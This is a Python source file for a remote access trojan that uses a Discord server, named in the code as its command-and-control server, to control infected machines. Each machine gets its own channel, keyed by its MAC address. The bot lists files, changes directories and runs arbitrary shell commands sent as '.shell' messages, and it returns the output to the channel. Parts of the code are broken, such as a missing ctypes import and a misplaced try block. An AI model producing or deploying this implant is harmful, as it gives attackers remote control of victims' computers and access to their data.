# THIS COMPONENT WILL:
# contain the BARE MINIMUM like shell, ls, cd, exit & reload

import os
import discord
import sys
from settings import guildid, bottoken
from uuid import getnode 
import subprocess


intents = discord.Intents.all()
intents.members = True
client = discord.Client(intents=intents)
global mac_address
mac_address = str(getnode())


def install_dependency(module):
    subprocess.check_call([sys.executable, "-m", "pip", "install", module])
    python_executable = sys.executable
    script_path = os.path.abspath(__file__)
    os.execl(python_executable, python_executable, script_path)

async def find_channel_by_name(guild, channel_name):
    for channel in guild.channels:
        if channel.name == channel_name:
            return channel
    return None

@client.event
async def on_ready():

    commandAndControlServer = client.get_guild(int(guildid))
    channel = await find_channel_by_name(commandAndControlServer, mac_address)
    if channel:
        await channel.send("Connection reestablished")
    else:
        channel = await commandAndControlServer.create_text_channel(mac_address)
        e = await channel.send("New Connection established")
        await e.pin()
        await channel.send("hello world")


@client.event
async def on_message(message):
    if message.author == client.user: 
        return
    else:
        match message.content.lower():
            case ".ls":
                file_list = "\n".join(os.listdir())
                if file_list == "":
                    file_list = "No Files Found"
                embed = discord.Embed(title=f"Files > {os.getcwd()}", description=f"```{file_list}```", color=0xfafafa)
                await message.reply(embed=embed)

            case ".exit":
                await message.channel.send("Exiting...")
                await client.close()

            case ".reload":
                await message.reply("restarting.")
                python_executable = sys.executable
                script_path = os.path.abspath(__file__)
                os.system(f"{python_executable} {script_path}")
                sys.exit()

        if message.content.lower().startswith(".cd"):
                desiredDirectory = message.content[4:]
                try:
                    os.chdir(desiredDirectory)
                    filesInDesiredDirectory = "\n".join(os.listdir())
                    if filesInDesiredDirectory == "":
                        filesInDesiredDirectory = "No Files Found"
                    embed = discord.Embed(title=f"Changed Directory > {os.getcwd()}", description=f"```{filesInDesiredDirectory}```", color=0xfafafa)
                except:
                    embed = discord.Embed(title="Error", description=f"```Directory Not Found```", color=0xfafafa)
                await message.reply(embed=embed)

        elif message.content.lower().startswith(".shell"):
            command = message.content[7:]
            output = os.popen(command).read()
            if output == "":
                output = "No Output"
            embed = discord.Embed(title=f"Shell Command > {command}", description=f"```{output}```", color=0xfafafa)
            await message.reply(embed=embed)
    # ADDED AUDIO MANIPULATION MODULE
        elif message.content.lower().startswith(".lower"):
            volume = message.content[7:]  # Extract volume value after the command
        try:
            volume = int(volume)  # Convert input to integer
            if volume < 0 or volume > 100:
                await message.channel.send("Please enter a volume between 0 and 100.")
                return

            if os.name == "posix":  # For macOS
                os.system(f"osascript -e 'set volume output volume {volume}'")
            elif os.name == "nt":  # For Windows
                # Calculate volume level (0 to 65535)
                volume_level = int(volume * 65535 / 100)
                ctypes.windll.winmm.waveOutSetVolume(0, volume_level + (volume_level << 16))
            else:
                await message.channel.send("Your system is not supported for volume adjustment.")
                return

            await message.channel.send(f"Volume has been set to {volume}%.")

        except ValueError:
            await message.channel.send("Invalid volume value. Please enter a number between 0 and 100.")
        except Exception as e:
            await message.channel.send(f"An error occurred: {e}")
            


client.run(bottoken)